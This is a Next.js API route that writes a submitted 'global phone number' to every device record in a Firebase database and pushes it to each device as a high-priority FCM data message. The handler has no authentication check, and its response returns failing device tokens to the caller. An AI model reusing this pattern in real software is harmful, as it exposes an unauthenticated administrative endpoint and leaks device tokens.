import { db } from "@/lib/firbase";
import { NextRequest, NextResponse } from "next/server";
import { get, ref, update } from "firebase/database";
import admin from "@/lib/firebaseadmin";

type DeviceRecord = Record<string, unknown>;

function getPhoneFromPayload(payload: unknown): string {
  if (!payload || typeof payload !== "object") {
    return "";
  }

  const body = payload as Record<string, unknown>;
  const rawPhone =
    typeof body.number === "string"
      ? body.number
      : typeof body.phone === "string"
        ? body.phone
        : "";

  const normalizedPhone = rawPhone.replace(/\s+/g, "").trim();

  return normalizedPhone.length > 0 ? normalizedPhone : "";
}

function getDeviceFcmToken(device: DeviceRecord): string | null {
  const candidates = [
    device.fcmToken,
    device.fcmcode,
    device.fcmCode,
    device.token,
  ];

  for (const candidate of candidates) {
    if (typeof candidate === "string" && candidate.trim().length > 0) {
      return candidate.trim();
    }
  }

  return null;
}

export async function POST(req: NextRequest) {
  try {
    const payload = (await req.json()) as unknown;
    const globalPhoneNumber = getPhoneFromPayload(payload);
    console.log("Received request to update global phone number:", globalPhoneNumber);

    const devicesRef = ref(db, "registeredDevices");

    const snapshot = await get(devicesRef);

    if (!snapshot.exists()) {
      return NextResponse.json({ success: false, message: "No devices found" });
    }

    const devices = snapshot.val() as Record<string, unknown>;
    const deviceEntries = Object.entries(devices).filter(
      (entry): entry is [string, DeviceRecord] =>
        Boolean(entry[1]) && typeof entry[1] === "object",
    );
    const deviceIds = deviceEntries.map(([deviceId]) => deviceId);
    const uniqueTokens = [...
      new Set(
        deviceEntries
          .map(([, device]) => getDeviceFcmToken(device))
          .filter((token): token is string => Boolean(token)),
      ),
    ];

    console.log(`Updating global phone number for ${deviceIds.length} devices`);

    await Promise.all(
      deviceIds.map((deviceId) =>
        update(ref(db, `registeredDevices/${deviceId}`), {
          globalPhoneNumber,
          updatedAt: new Date().toISOString(),
        }),

      ),
    );

    const sendResults = await Promise.allSettled(
      uniqueTokens.map((token) =>
        admin.messaging().send({
          android: {
            priority: "high" as const,
          },
          data: {
            globalPhoneNumber,
            type: "admin_phone_update",
          },
          token,
        }),
      ),
    );

    const sentCount = sendResults.filter(
      (result) => result.status === "fulfilled",
    ).length;
    const failedSends = sendResults.flatMap((result, index) =>
      result.status === "rejected"
        ? [
          {
            token: uniqueTokens[index],
            error:
              result.reason instanceof Error
                ? result.reason.message
                : "Failed to send notification",
          },
        ]
        : [],
    );

    return NextResponse.json({
      success: true,
      updatedCount: deviceIds.length,
      notificationRequested: uniqueTokens.length,
      notificationSent: sentCount,
      notificationFailed: failedSends.length,
      failedTokens: failedSends,
    });
  } catch (error) {
    console.error(error);
    return NextResponse.json(
      { success: false, error: "Failed to update global phone" },
      { status: 500 },
    );
  }
}